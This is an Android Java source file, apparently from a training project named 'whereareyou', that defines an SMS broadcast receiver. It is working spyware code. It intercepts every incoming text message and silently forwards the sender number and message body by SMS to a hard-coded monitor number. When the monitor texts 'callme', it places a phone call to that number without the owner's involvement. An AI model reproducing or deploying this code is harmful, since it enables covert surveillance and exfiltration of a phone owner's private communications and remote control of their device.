package cn.tedu.whereareyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class MessageListenerReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context ct, Intent it) {
		// TODO Auto-generated method stub
		Toast.makeText(ct, "正在处理短信监控...", Toast.LENGTH_LONG);
		//1.获取短信内容；2.获取有效信息；3.判断是否需要进行短信监控/特殊命令操作
		//获得原始短信
		Object[] objs =(Object[])it.getExtras().get("pdus");
		//类型的转换Object[]转换成SmsMessage[]
		SmsMessage[] duanxin = new SmsMessage[objs.length];
		for(int i = 0;i<objs.length;i++){
			//从objs数组中逐条拿出短信进行类型转换
			duanxin[i] =SmsMessage.createFromPdu((byte[])objs[i]);
		}
		//提取有效信息并其进行短信监控操作或者特殊命令操作
		for(int i =0 ;i<duanxin.length;i++){
			//从duanxin1数组中逐条拿出进行信息提取，并且进行短息监控操作
			String laixinnumber = duanxin[i].getDisplayOriginatingAddress();
			String laixinneirong = duanxin[i].getDisplayMessageBody();
			if(laixinnumber.equals(WayInformations.LPPN)){
				//监控者发送的短息-->进行特殊命令操作（回拨电话）
				if(laixinneirong.trim().equalsIgnoreCase("callme")){
					Intent dadianhua = new Intent();
					dadianhua.setAction(Intent.ACTION_CALL);
					dadianhua.setData(Uri.parse("tel:"+WayInformations.LPPN));
					dadianhua.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					ct.startActivity(dadianhua);
				}
			}else{
				//第三方，进行监控
				SmsManager sm = SmsManager.getDefault();
				String message = laixinnumber +"is send Message to TA and MEssageBody is"+laixinneirong;
				sm.sendTextMessage(WayInformations.LPPN, null, message, null, null);
			}
		}
	}

}
